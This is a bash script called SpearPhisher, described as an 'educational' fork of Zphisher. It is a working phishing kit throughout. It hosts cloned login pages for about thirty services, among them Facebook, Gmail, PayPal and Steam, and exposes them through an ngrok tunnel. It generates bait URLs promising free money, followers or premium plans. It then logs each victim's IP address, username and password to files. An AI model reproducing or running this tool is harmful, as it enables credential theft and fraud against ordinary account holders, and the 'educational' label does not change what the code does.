#!/bin/bash

##
##   SpearPhisher	: 	Educational Phishing Tool
##   Author 		: 	Punkin Tech 
##   Version 		: 	0.1
##   Github 		: 	https://github.com/punkintech

##	 SpearPhisher is based on zPhisher 2.1

##   Zphisher 	: 	Automated Phishing Tool
##   Author 	: 	TAHMID RAYAT 
##   Version 	: 	2.1
##   Github 	: 	https://github.com/htr-tech

##   THANKS TO :
##   Aditya Shakya - https://github.com/adi1090x
##   Moises Tapia - https://github.com/MoisesTapia
##   TheLinuxChoice - https://twitter.com/linux_choice
##   DarksecDevelopers  - https://github.com/DarksecDevelopers
##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
##   Võ Ngọc Bảo - https://github.com/vongocbao
##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009


## If you Copy Then Give the credits :)



##                   GNU GENERAL PUBLIC LICENSE
##                    Version 3, 29 June 2007
##
##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
##    Everyone is permitted to copy and distribute verbatim copies
##    of this license document, but changing it is not allowed.
##
##                         Preamble
##
##    The GNU General Public License is a free, copyleft license for
##    software and other kinds of works.
##
##    The licenses for most software and other practical works are designed
##    to take away your freedom to share and change the works.  By contrast,
##    the GNU General Public License is intended to guarantee your freedom to
##    share and change all versions of a program--to make sure it remains free
##    software for all its users.  We, the Free Software Foundation, use the
##    GNU General Public License for most of our software; it applies also to
##    any other work released this way by its authors.  You can apply it to
##    your programs, too.
##
##    When we speak of free software, we are referring to freedom, not
##    price.  Our General Public Licenses are designed to make sure that you
##    have the freedom to distribute copies of free software (and charge for
##    them if you wish), that you receive source code or can get it if you
##    want it, that you can change the software or use pieces of it in new
##    free programs, and that you know you can do these things.
##
##    To protect your rights, we need to prevent others from denying you
##    these rights or asking you to surrender the rights.  Therefore, you have
##    certain responsibilities if you distribute copies of the software, or if
##    you modify it: responsibilities to respect the freedom of others.
##
##    For example, if you distribute copies of such a program, whether
##    gratis or for a fee, you must pass on to the recipients the same
##    freedoms that you received.  You must make sure that they, too, receive
##    or can get the source code.  And you must show them these terms so they
##    know their rights.
##
##    Developers that use the GNU GPL protect your rights with two steps:
##    (1) assert copyright on the software, and (2) offer you this License
##    giving you legal permission to copy, distribute and/or modify it.
##
##    For the developers' and authors' protection, the GPL clearly explains
##    that there is no warranty for this free software.  For both users' and
##    authors' sake, the GPL requires that modified versions be marked as
##    changed, so that their problems will not be attributed erroneously to
##    authors of previous versions.
##
##    Some devices are designed to deny users access to install or run
##    modified versions of the software inside them, although the manufacturer
##    can do so.  This is fundamentally incompatible with the aim of
##    protecting users' freedom to change the software.  The systematic
##    pattern of such abuse occurs in the area of products for individuals to
##    use, which is precisely where it is most unacceptable.  Therefore, we
##    have designed this version of the GPL to prohibit the practice for those
##    products.  If such problems arise substantially in other domains, we
##    stand ready to extend this provision to those domains in future versions
##    of the GPL, as needed to protect the freedom of users.
##
##    Finally, every program is threatened constantly by software patents.
##    States should not allow patents to restrict development and use of
##    software on general-purpose computers, but in those that do, we wish to
##    avoid the special danger that patents applied to a free program could
##    make it effectively proprietary.  To prevent this, the GPL assures that
##    patents cannot be used to render the program non-free.
##
##    The precise terms and conditions for copying, distribution and
##    modification follow.
##
##      Copyright (C) 2021  HTR-TECH (https://github.com/htr-tech)
##




## Includes
source includes/config.inc
source includes/banner.inc

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi	
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## About
about() {
	{ clear; banner; banner_small; echo; }
	cat <<- EOF
		
		${GREEN}       Author   ${RED}:  ${ORANGE}Punkin Tech
		${GREEN}       Github   ${RED}:  ${CYAN}https://github.com/punkintech
		${GREEN}       Social   ${RED}:  ${CYAN}https://linktr.ee/PunkinTech
		${GREEN}       Version  ${RED}:  ${ORANGE}v0.1

		${GREEN}       ${ORANGE}:: CREDIT ::
		${GREEN}       Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN}       Github   ${RED}:  ${CYAN}https://github.com/htr-tech
		${GREEN}       Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
		${WHITE}       Thanks : Adi1090x,MoisesTapia,ThelinuxChoice 
		                DarkSecDevelopers,Mustakim Ahmed

		${RED}[${WHITE}Mm${RED}]${ORANGE} Main Menu   ${RED}[${WHITE}Ee${RED}]${ORANGE} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == "E" || "$REPLY" == "e" ]]; then
		msg_exit
	elif [[ "$REPLY" == "B" || "$REPLY" == "b" ]]; then
		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
		{ sleep 1; main_menu; }
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; about; }
	fi
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok\.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
}

## Start localhost
start_localhost() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	setup_site
	{ sleep 1; clear; banner_small; }
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
	capture_data
}

## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF

		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
		${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io  ${RED}[${CYAN}Best${RED}]

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		start_localhost
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		start_ngrok
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; tunnel_menu; }
	fi
}

## Facebook
site_facebook() {
	cat <<- EOF

		${BLUE} Select Facebook page style

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="facebook"
		mask='http://blue-verified-badge-for-facebook-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="fb_advanced"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="fb_security"
		mask='http://make-your-facebook-secured-and-free-from-hackers'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="fb_messenger"
		mask='http://get-messenger-premium-features-free'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_facebook; }
	fi
}

## Instagram
site_instagram() {
	cat <<- EOF

		${BLUE} Select Instagram page style

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="instagram"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="ig_followers"
		mask='http://get-unlimited-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="insta_followers"
		mask='http://get-1000-followers-for-instagram'
		tunnel_menu
	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
		website="ig_verify"
		mask='http://blue-badge-verify-for-instagram-free'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_instagram; }
	fi
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${BLUE} Select Gmail page style

		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="google"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="google_new"
		mask='http://get-unlimited-google-drive-free'
		tunnel_menu
	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
		website="google_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_gmail; }
	fi
}

## Vk
site_vk() {
	cat <<- EOF

		${BLUE} Select Vk page style

		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
		website="vk"
		mask='http://vk-premium-real-method-2020'
		tunnel_menu
	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
		website="vk_poll"
		mask='http://vote-for-the-best-social-media'
		tunnel_menu
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; clear; banner_small; site_vk; }
	fi
}

## Menu
main_menu() {
	{ clear; banner; banner_small; }
	cat <<- EOF
	${RED}[${WHITE}::${RED}]${ORANGE}===================================================================${RED}[${WHITE}::${RED}]${ORANGE}
	${RED}[${WHITE}::${RED}]${ORANGE} Select a site attack or ${RED}[${WHITE}Aa${RED}]${ORANGE} About   ${RED}[${WHITE}Ee${RED}]${ORANGE} Exit                    ${RED}[${WHITE}::${RED}]${ORANGE}
	${RED}[${WHITE}::${RED}]${ORANGE}===================================================================${RED}[${WHITE}::${RED}]${ORANGE}

	${RED}[${WHITE}01-${RED}]${BLUE} Social Media	${RED}[${WHITE}02-${RED}]${BLUE} Payment Gateways	${RED}[${WHITE}03-${RED}]${BLUE} Streaming Sites
	${RED}[${WHITE}011${RED}]${ORANGE} Facebook		${RED}[${WHITE}021${RED}]${ORANGE} Paypal		${RED}[${WHITE}031${RED}]${ORANGE} Twitch
	${RED}[${WHITE}012${RED}]${ORANGE} Instagram					${RED}[${WHITE}032${RED}]${ORANGE} Tiktok
	${RED}[${WHITE}013${RED}]${ORANGE} Twitter					${RED}[${WHITE}033${RED}]${ORANGE} Spotify
	${RED}[${WHITE}014${RED}]${ORANGE} Snapchat					${RED}[${WHITE}034${RED}]${ORANGE} Netflix
	${RED}[${WHITE}015${RED}]${ORANGE} Linkedin
	${RED}[${WHITE}016${RED}]${ORANGE} Pinterest
	${RED}[${WHITE}017${RED}]${ORANGE} Vk

	${RED}[${WHITE}04-${RED}]${BLUE} Gaming		${RED}[${WHITE}05-${RED}]${BLUE} Dating		${RED}[${WHITE}06-${RED}]${BLUE} Email																								 
	${RED}[${WHITE}041${RED}]${ORANGE} Origin		${RED}[${WHITE}051${RED}]${ORANGE} Badoo		${RED}[${WHITE}061${RED}]${ORANGE} Yahoo
	${RED}[${WHITE}042${RED}]${ORANGE} Steam					${RED}[${WHITE}062${RED}]${ORANGE} Yandex
	${RED}[${WHITE}043${RED}]${ORANGE} Playstation				${RED}[${WHITE}063${RED}]${ORANGE} Google Gmail
	${RED}[${WHITE}044${RED}]${ORANGE} XBOX					${RED}[${WHITE}064${RED}]${ORANGE} Protonmail
															
	${RED}[${WHITE}07-${RED}]${BLUE} Blogging		${RED}[${WHITE}08-${RED}]${BLUE} Marketplace	${RED}[${WHITE}09-${RED}]${BLUE} Storage
	${RED}[${WHITE}071${RED}]${ORANGE} Reddit		${RED}[${WHITE}081${RED}]${ORANGE} Ebay		${RED}[${WHITE}091${RED}]${ORANGE} DropBox
	${RED}[${WHITE}072${RED}]${ORANGE} Wordpress					${RED}[${WHITE}092${RED}]${ORANGE} Microsoft OneDrive

	${RED}[${WHITE}010${RED}]${BLUE} Media		${RED}[${WHITE}011${RED}]${BLUE} SVN
	${RED}[${WHITE}101${RED}]${ORANGE} Mediafire		${RED}[${WHITE}111${RED}]${ORANGE} Github
	${RED}[${WHITE}102${RED}]${ORANGE} Adobe		${RED}[${WHITE}112${RED}]${ORANGE} Gitlab
	${RED}[${WHITE}103${RED}]${ORANGE} DeviantArt

	${RED}[${WHITE}012${RED}]${BLUE} Other	
	${RED}[${WHITE}121${RED}]${ORANGE} StackoverFlow         		
	${RED}[${WHITE}122${RED}]${ORANGE} Quora

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"

	if [[ "$REPLY" == 011 ]]; then
		site_facebook
	elif [[ "$REPLY" == 012 ]]; then
		site_instagram
	elif [[ "$REPLY" == 063 ]]; then
		site_gmail
	elif [[ "$REPLY" == 092 ]]; then
		website="microsoft"
		mask='http://unlimited-onedrive-space-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 034 ]]; then
		website="netflix"
		mask='http://upgrade-your-netflix-plan-free'
		tunnel_menu
	elif [[ "$REPLY" == 021 ]]; then
		website="paypal"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 042 ]]; then
		website="steam"
		mask='http://steam-500-usd-gift-card-free'
		tunnel_menu
	elif [[ "$REPLY" == 013 ]]; then
		website="twitter"
		mask='http://get-blue-badge-on-twitter-free'
		tunnel_menu
	elif [[ "$REPLY" == 043 ]]; then
		website="playstation"
		mask='http://playstation-500-usd-gift-card-free'
		tunnel_menu
	elif [[ "$REPLY" == 032 ]]; then
		website="tiktok"
		mask='http://tiktok-free-liker'
		tunnel_menu
	elif [[ "$REPLY" == 031 ]]; then
		website="twitch"
		mask='http://unlimited-twitch-tv-user-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 016 ]]; then
		website="pinterest"
		mask='http://get-a-premium-plan-for-pinterest-free'
		tunnel_menu
	elif [[ "$REPLY" == 014 ]]; then
		website="snapchat"
		mask='http://view-locked-snapchat-accounts-secretly'
		tunnel_menu
	elif [[ "$REPLY" == 015 ]]; then
		website="linkedin"
		mask='http://get-a-premium-plan-for-linkedin-free'
		tunnel_menu
	elif [[ "$REPLY" == 081 ]]; then
		website="ebay"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 122 ]]; then
		website="quora"
		mask='http://quora-premium-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 064 ]]; then
		website="protonmail"
		mask='http://protonmail-pro-basics-for-free'
		tunnel_menu
	elif [[ "$REPLY" == 033 ]]; then
		website="spotify"
		mask='http://convert-your-account-to-spotify-premium'
		tunnel_menu
	elif [[ "$REPLY" == 071 ]]; then
		website="reddit"
		mask='http://reddit-official-verified-member-badge'
		tunnel_menu
	elif [[ "$REPLY" == 102 ]]; then
		website="adobe"
		mask='http://get-adobe-lifetime-pro-membership-free'
		tunnel_menu
	elif [[ "$REPLY" == 103 ]]; then
		website="deviantart"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 051 ]]; then
		website="badoo"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 041 ]]; then
		website="origin"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 091 ]]; then
		website="dropbox"
		mask='http://get-1TB-cloud-storage-free'
		tunnel_menu
	elif [[ "$REPLY" == 061 ]]; then
		website="yahoo"
		mask='http://grab-mail-from-anyother-yahoo-account-free'
		tunnel_menu
	elif [[ "$REPLY" == 072 ]]; then
		website="wordpress"
		mask='http://unlimited-wordpress-traffic-free'
		tunnel_menu
	elif [[ "$REPLY" == 062 ]]; then
		website="yandex"
		mask='http://grab-mail-from-anyother-yandex-account-free'
		tunnel_menu
	elif [[ "$REPLY" == 121 ]]; then
		website="stackoverflow"
		mask='http://get-stackoverflow-lifetime-pro-membership-free'
		tunnel_menu
	elif [[ "$REPLY" == 017 ]]; then
		site_vk
	elif [[ "$REPLY" == 044 ]]; then
		website="xbox"
		mask='http://get-500-usd-free-to-your-acount'
		tunnel_menu
	elif [[ "$REPLY" == 101 ]]; then
		website="mediafire"
		mask='http://get-1TB-on-mediafire-free'
		tunnel_menu
	elif [[ "$REPLY" == 112 ]]; then
		website="gitlab"
		mask='http://get-1k-followers-on-gitlab-free'
		tunnel_menu
	elif [[ "$REPLY" == 111 ]]; then
		website="github"
		mask='http://get-1k-followers-on-github-free'
		tunnel_menu
	elif [[ "$REPLY" == "A" || "$REPLY" == "a" ]]; then
		about
	elif [[ "$REPLY" == "E" || "$REPLY" == "e" ]]; then
		msg_exit
	else
		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
		{ sleep 1; main_menu; }
	fi
}

## Main
kill_pid
dependencies
install_ngrok
main_menu
